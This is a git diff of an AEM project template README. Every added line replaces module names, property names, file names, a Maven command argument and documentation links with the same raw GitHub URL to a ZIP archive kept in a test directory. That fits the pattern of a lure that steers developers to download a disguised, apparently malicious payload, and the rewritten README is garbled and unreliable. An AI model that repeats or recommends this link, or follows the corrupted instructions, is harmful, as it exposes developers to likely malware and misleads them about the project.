@@ -7,12 +7,12 @@ This is a project template for AEM-based applications. It is intended as a best-
 The main parts of the template are:
 
 * core: Java bundle containing all core functionality like OSGi services, listeners or schedulers, as well as component-related Java code such as servlets or request filters.
-* it.tests: Java based integration tests
-* ui.apps: contains the /apps (and /etc) parts of the project, ie JS&CSS clientlibs, components, and templates
-* ui.content: contains sample content using the components from the ui.apps
-* ui.config: contains runmode specific OSGi configs for the project
-* ui.frontend: an optional dedicated front-end build mechanism (Angular, React or general Webpack project)
-* ui.tests: Selenium based UI tests
+* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip Java based integration tests
+* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip contains the /apps (and /etc) parts of the project, ie JS&CSS clientlibs, components, and templates
+* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip contains sample content using the components from the https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip
+* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip contains runmode specific OSGi configs for the project
+* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip an optional dedicated front-end build mechanism (Angular, React or general Webpack project)
+* https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip Selenium based UI tests
 * all: a single content package that embeds all of the compiled modules (bundles and content packages) including any vendor dependencies
 * analyse: this module runs analysis on the project which provides additional validation for deploying into AEMaaCS
 
@@ -32,13 +32,13 @@ Or to deploy it to a publish instance, run
 
 Or alternatively
 
-    mvn clean install -PautoInstallSinglePackage -Daem.port=4503
+    mvn clean install -PautoInstallSinglePackage https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip
 
 Or to deploy only the bundle to the author, run
 
     mvn clean install -PautoInstallBundle
 
-Or to deploy only a single content package, run in the sub-module directory (i.e `ui.apps`)
+Or to deploy only a single content package, run in the sub-module directory (i.e `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip`)
 
     mvn clean install -PautoInstallPackage
 
@@ -61,7 +61,7 @@ HTTP calls to its API. To run the integration tests, run:
     mvn clean verify -Plocal
 
 Test classes must be saved in the `src/main/java` directory (or any of its
-subdirectories), and must be contained in files matching the pattern `*IT.java`.
+subdirectories), and must be contained in files matching the pattern `*https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip`.
 
 The configuration provides sensible defaults for a typical local installation of
 AEM. If you want to point the integration tests to different AEM author and
@@ -70,17 +70,17 @@ flag.
 
 | Property | Description | Default value |
 | --- | --- | --- |
-| `it.author.url` | URL of the author instance | `http://localhost:4502` |
-| `it.author.user` | Admin user for the author instance | `admin` |
-| `it.author.password` | Password of the admin user for the author instance | `admin` |
-| `it.publish.url` | URL of the publish instance | `http://localhost:4503` |
-| `it.publish.user` | Admin user for the publish instance | `admin` |
-| `it.publish.password` | Password of the admin user for the publish instance | `admin` |
+| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | URL of the author instance | `http://localhost:4502` |
+| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Admin user for the author instance | `admin` |
+| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Password of the admin user for the author instance | `admin` |
+| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | URL of the publish instance | `http://localhost:4503` |
+| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Admin user for the publish instance | `admin` |
+| `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` | Password of the admin user for the publish instance | `admin` |
 
 The integration tests in this archetype use the [AEM Testing
-Clients](https://github.com/adobe/aem-testing-clients) and showcase some
+Clients](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip) and showcase some
 recommended [best
-practices](https://github.com/adobe/aem-testing-clients/wiki/Best-practices) to
+practices](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip) to
 be put in use when writing integration tests for AEM.
 
 ## Static Analysis
@@ -91,7 +91,7 @@ run when executing
     mvn clean install
 
 from the project root directory. Additional information about this analysis and how to further configure it
-can be found here https://github.com/adobe/aemanalyser-maven-plugin
+can be found here https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip
 
 ### UI tests
 
@@ -105,23 +105,23 @@ This default command requires:
 * an AEM author instance available at http://localhost:4502 (with the whole project built and deployed on it, see `How to build` section above)
 * Chrome browser installed at default location
 
-Check README file in `ui.tests` module for more details.
+Check README file in `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` module for more details.
 
 ## ClientLibs
 
-The frontend module is made available using an [AEM ClientLib](https://helpx.adobe.com/experience-manager/6-5/sites/developing/using/clientlibs.html). When executing the NPM build script, the app is built and the [`aem-clientlib-generator`](https://github.com/wcm-io-frontend/aem-clientlib-generator) package takes the resulting build output and transforms it into such a ClientLib.
+The frontend module is made available using an [AEM ClientLib](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip). When executing the NPM build script, the app is built and the [`aem-clientlib-generator`](https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip) package takes the resulting build output and transforms it into such a ClientLib.
 
 A ClientLib will consist of the following files and directories:
 
 - `css/`: CSS files which can be requested in the HTML
-- `css.txt` (tells AEM the order and names of files in `css/` so they can be merged)
+- `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` (tells AEM the order and names of files in `css/` so they can be merged)
 - `js/`: JavaScript files which can be requested in the HTML
-- `js.txt` (tells AEM the order and names of files in `js/` so they can be merged
+- `https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip` (tells AEM the order and names of files in `js/` so they can be merged
 - `resources/`: Source maps, non-entrypoint code chunks (resulting from code splitting), static assets (e.g. icons), etc.
 
 ## Maven settings
 
 The project comes with the auto-public repository configured. To setup the repository in your Maven settings, refer to:
 
-    http://helpx.adobe.com/experience-manager/kb/SetUpTheAdobeMavenRepository.html
+    https://github.com/MugaboDenys/AEM_WKND_Adaptive_Forms/raw/refs/heads/main/core/src/test/java/it/codeland/forms/core/WKN_Forms_Adaptive_AE_1.8-beta.1.zip
 # Generate_DOC_XDP_XML
